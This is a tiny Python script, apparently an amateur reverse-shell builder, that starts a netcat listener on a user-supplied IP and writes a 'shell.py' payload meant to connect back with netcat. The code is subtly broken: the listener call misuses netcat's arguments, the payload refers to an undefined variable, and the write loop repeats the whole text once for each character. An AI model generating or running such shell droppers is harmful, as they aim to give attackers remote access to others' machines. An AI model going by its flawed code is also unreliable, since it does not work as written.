import os

ip = input("[*] Enter Your Listening IP Address: ")
os.system("nc -l "+ip)
print ("""
[*] Now Open A New Terminal Tab And Type In:
nc -l """+ip)

textList= '''
import os

os.system("nc "+IP)
'''
outF = open("shell.py", "w")
for line in textList:
  outF.write(textList)
outF.close()